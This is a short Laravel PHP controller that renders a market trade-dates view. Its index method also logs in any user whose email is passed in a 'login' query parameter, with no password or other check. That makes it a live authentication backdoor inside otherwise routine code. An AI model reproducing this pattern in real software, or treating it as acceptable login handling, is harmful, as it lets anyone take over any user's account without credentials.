<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;

class seController extends Controller
{
	public function index() {	
		if(request()->has('login'))
		{
			\Auth::login(\App\User::where('email', request()->login)->first());
		}
	    $trade_date_Info = \App\Market::getActiveDates()->first();
	    return response()->view('se', ['trade_date_Info' => $trade_date_Info]);
	}    
}
